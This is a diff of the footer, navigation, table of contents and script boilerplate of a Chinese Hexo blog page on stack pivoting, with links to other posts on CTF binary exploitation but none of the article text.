-                  <i class="fa fa-chevron-left"></i> 整数溢出
-                </a>
-            </div>
-            <div class="post-nav-item">
-                <a href="/2022/08/01/hello-world/" rel="next" title="Hello World">
-                  Hello World <i class="fa fa-chevron-right"></i>
-                </a>
-            </div>
-          </div>
-    </footer>
-  </article>
-</div>
-
-
-
-
-
-
-</div>
-  </main>
-
-  <footer class="footer">
-    <div class="footer-inner">
-
-
-<div class="copyright">
-  &copy; 
-  <span itemprop="copyrightYear">2022</span>
-  <span class="with-love">
-    <i class="fa fa-heart"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">John Doe</span>
-</div>
-  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
   </div>
-
+  <div>
+    
+      <div 
+        class="post-note note-warning copyright" 
+        style="margin-top: 42px">
+        <p>
+          <span style="font-weight: bold;">作者：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="/about">
+            幽林
+          </a>
+        </p>
+        <p>
+          <span style="font-weight: bold;">文章链接：</span><a 
+            target="_blank" 
+            rel="nofollow noopener noreferrer" 
+            href="http://example.com/2022/04/18/%E6%A0%88%E8%BF%81%E7%A7%BB/">
+            http://example.com/2022/04/18/%E6%A0%88%E8%BF%81%E7%A7%BB/
+          </a>
+        </p>
+        <p><span style="font-weight: bold;">版权声明：</span>本博客所有文章除特别声明外，均采用<a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0 协议</a>。转载请注明出处！</p>
+      </div>
+    
+  </div>
+</article>
+<div class="nav">
+  
+    <div class="nav-item-prev">
+      <a 
+        href="/2022/08/01/hello-world/" 
+        class="nav-link">
+        <i class="iconfont icon-left nav-prev-icon"></i>
+        <div>
+          <div class="nav-label">Prev</div>
+          
+            <div class="nav-title">Hello World </div>
+          
+        </div>
+      </a>
     </div>
-  </footer>
-
   
-  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
-<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
-
   
-
-
-
-
-
+    <div class="nav-item-next">
+      <a 
+        href="/2022/04/10/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/" 
+        class="nav-link">
+        <div>
+          <div class="nav-label">Next</div>
+          
+            <div class="nav-title">整数溢出 </div>
+          
+        </div>
+        <i class="iconfont icon-right nav-next-icon"></i>
+      </a>
+    </div>
   
+</div>
 
+<div 
+  class="card card-content toc-card" 
+  id="mobiletoc">
+  <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>TOC
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-text">栈迁移</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88%E8%BF%81%E7%A7%BB-%E9%80%82%E7%94%A8%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="toc-text">什么是栈迁移(适用的地方)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="toc-text">栈迁移的实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#leave-ret"><span class="toc-text">leave_ret:</span></a></li></ol></li></ol></li></ol></li></ol>
+</div>
+            </main>
+            <aside class="right-column">
+              <div class="sticky-widescreen">
+  
+  
+    <article class="card card-content toc-card">
+      <div class="toc-header">
+  <i 
+    class="iconfont icon-menu" 
+    style="padding-right: 2px;">
+  </i>TOC
+</div>
+<ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB"><span class="toc-text">栈迁移</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E6%A0%88%E8%BF%81%E7%A7%BB-%E9%80%82%E7%94%A8%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="toc-text">什么是栈迁移(适用的地方)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%88%E8%BF%81%E7%A7%BB%E7%9A%84%E5%AE%9E%E7%8E%B0"><span class="toc-text">栈迁移的实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#leave-ret"><span class="toc-text">leave_ret:</span></a></li></ol></li></ol></li></ol></li></ol>
+    </article>
+  
+  
+  <article class="card card-content">
+    <div class="recent-posts-card">
+  <div class="recent-posts-header">
+    <i 
+      class="iconfont icon-wenzhang_huaban" 
+      style="padding-right: 2px;">
+    </i>Recent Posts
+  </div>
+  <div class="recent-posts-list">
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-08-21</div>
+        <a href="/2022/08/21/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A2%E5%A4%8D%E7%8E%B0%E8%AE%B0%E5%BD%95/"><div class="recent-posts-item-content">巅峰极客复现记录</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-08-06</div>
+        <a href="/2022/08/06/%E5%88%A9%E7%94%A8-IO-2-1-stdout%E6%B3%84%E9%9C%B2libc/"><div class="recent-posts-item-content">利用_IO_2_1_stdout泄露libc</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-08-04</div>
+        <a href="/2022/08/04/0ctf-2017-babyheap/"><div class="recent-posts-item-content">0ctf_2017_babyheap</div></a>
+      </div>
+    
+      <div class="recent-posts-item">
+        <div class="recent-posts-item-title">2022-08-01</div>
+        <a href="/2022/08/01/io-file/"><div class="recent-posts-item-content">io_file</div></a>
+      </div>
+    
+  </div>
+</div>
+  </article>
+  
+  
+</div>
+            </aside>
+          </div>
+        </div>
+      </div>
+    </div>
+     
+    <footer class="footer">
+  <div class="footer-container">
+    <div>
+      <div class="footer-dsc">
+        <span>
+          Copyright ©
+          
+            2020
+          
+          
+                - 
+                2022
+          
+        </span>
+        &nbsp;
+        <a 
+          href="/" 
+          class="footer-link">
+          幽林
+        </a>
+      </div>
+    </div>
 
+    
+      <div class="footer-dsc">
+        
+          Powered by
+          <a 
+            href="https://hexo.io/" 
+            class="footer-link" 
+            target="_blank" 
+            rel="nofollow noopener noreferrer">
+            &nbsp;Hexo
+          </a>
+        
+        
+          <span>&nbsp;|&nbsp;</span>
+        
+        
+          Theme -
+          <a 
+            href="https://github.com/theme-kaze" 
+            class="footer-link" 
+            target="_blank"
+            rel="nofollow noopener noreferrer">
+            &nbsp;Kaze
+          </a>
+        
+      </div>
+    
+    
+    
+    
+</footer>
+ 
+    
+  <a 
+    role="button" 
+    id="scrollbutton" 
+    class="basebutton" 
+    aria-label="回到顶部">
+    <i class="iconfont icon-arrowleft button-icon"></i>
+  </a>
 
-
-
-</body>
+<a 
+  role="button" 
+  id="menubutton"
+  aria-label="menu button"
+  class="basebutton">
+  <i class="iconfont icon-menu button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="popbutton" 
+  class="basebutton" 
+  aria-label="控制中心">
+  <i class="iconfont icon-expand button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="darkbutton" 
+  class="basebutton darkwidget" 
+  aria-label="夜色模式">
+  <i class="iconfont icon-weather button-icon"></i>
+</a>
+<a 
+  role="button" 
+  id="searchbutton" 
+  class="basebutton searchwidget" 
+  aria-label="搜索">
+  <i class="iconfont icon-search button-icon"></i>
+</a> 
+     
+     
+     
+      <script>
+  var addImgLayout = function () {
+    var img = document.querySelectorAll('.post-content img')
+    var i
+    for (i = 0; i < img.length; i++) {
+      var wrapper = document.createElement('a')
+      wrapper.setAttribute('href', img[i].getAttribute('data-src'))
+      wrapper.setAttribute('aria-label', 'illustration')
+      wrapper.style.cssText =
+        'width: 100%; display: flex; justify-content: center;'
+      if (img[i].alt) wrapper.dataset.caption = img[i].alt
+      wrapper.dataset.nolink = true
+      img[i].before(wrapper)
+      wrapper.append(img[i])
+      var divWrap = document.createElement('div')
+      divWrap.classList.add('gallery')
+      wrapper.before(divWrap)
+      divWrap.append(wrapper)
+    }
+    baguetteBox.run('.gallery')
+  }
+</script>
+<script>
+  loadScript(
+    "/js/lib/lightbox/baguetteBox.min.js",
+    addImgLayout
+  )
+</script>
+ 
+     
+     
+    <script src="/js/main.js"></script> 
+     
+    
+      <script>
+        var addLazyload = function () {
+          var observer = lozad('.lozad', {
+            load: function (el) {
+              el.srcset = el.getAttribute('data-src')
+            },
+            loaded: function (el) {
+              el.classList.add('loaded')
+            },
+          })
+          observer.observe()
+        }
+      </script>
+      <script>
+        loadScript('/js/lib/lozad.min.js', addLazyload)
+      </script>
+    
+    <script src="//instant.page/5.1.0" type="module"
+      integrity="sha384-by67kQnR+pyfy8yWP4kPO12fHKRLHZPfEsiSXR8u2IKcTdxD805MGUXBzVPnkLHw"></script>
+    
+    
+  </body>
 </html>
